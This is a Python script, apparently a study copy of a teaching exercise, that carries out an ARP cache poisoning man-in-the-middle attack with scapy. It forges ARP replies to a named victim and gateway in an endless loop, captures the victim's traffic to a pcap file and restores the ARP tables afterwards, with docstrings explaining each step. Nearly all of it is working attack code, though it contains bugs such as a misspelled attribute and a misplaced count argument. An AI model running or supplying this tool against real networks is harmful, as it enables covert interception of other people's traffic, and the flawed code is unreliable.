from concurrent.futures import thread
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

import os
import sys
import time


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None
"""
This creates a packet given a specific IP, and identifies that this packet should be broadcats, ARP asks each node wether it has the target IP.
The srp function sends and receives packets on network layer 2, and the answer is sent to the resp variable, which should have the MAC address
for the target IP
"""

class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*50)
    """
    The class is initialized with the victim and gateway IPs and the interface to use is specified.  WIth this, the object values get populated.
    """

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()  
    """
    This method does the main work of the Arper object.  This runs two processes, one to poison the ARP cache and another so the operator can watch the attack in progress
    """
    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(poison_victim.summary())
        print('-'*50)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymmac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print('-'*50)
        print(f'Beginning the ARP poison. [Ctrl-C to stop]')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_gateway)
                send(poison_victim)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)
            """
            the poison method sets up the data used to poison the victim and the gateway.
            Frist a poisoned ARP packet intended for the victim is created.  As well as for the the gateway.
            The gateway is poisoned by sending it the victim's IP address but the attacker's MAC address.
            Next, we start sending poisoned packets to their destinations in an infinite loop to make sure the ARP cache is poisoned for the duration of the attack.
            """
    def sniff(self, count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        self.restore()
        self.poison_thread.terminate()
        print('Finished')
    """
    Sniff sleeps for five seconds before starting to sniff, in order to give the posion thread time to start working.
    It sniffs for a number of packets, filtering for packets that have the victims IP
    Once the packets are captured, they are written to the arper.pcap file
    """
    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff',
            count=5))
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff',
            count=5))

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()























